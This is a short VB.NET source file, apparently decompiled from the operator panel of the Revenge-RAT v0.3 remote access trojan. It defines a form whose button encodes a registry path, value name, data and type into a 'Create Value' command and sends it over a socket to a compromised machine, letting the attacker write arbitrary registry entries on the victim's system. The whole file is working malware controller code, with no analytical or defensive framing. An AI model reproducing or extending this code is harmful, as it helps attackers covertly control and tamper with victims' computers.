Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Rve
    Public CG As String
    Public D As Boolean
    Public P As String
    Public Sock As Integer
    Public V As Integer
    Private Sub Create_Click(sender As Object, e As EventArgs) Handles Create.Click
        If ((Me.VName.Text.Length > 0) AndAlso (Me.ValueData.Text.Length > 0)) Then
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(("Create Value" & My.Forms.Main.Key), SocketServer.Encode(Me.P)), My.Forms.Main.Key), SocketServer.Encode(Me.VName.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.ValueData.Text)), My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.V))), My.Forms.Main.Key), Me.CG), My.Forms.Main.Key), Me.D)}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.Close()
        End If
    End Sub
End Class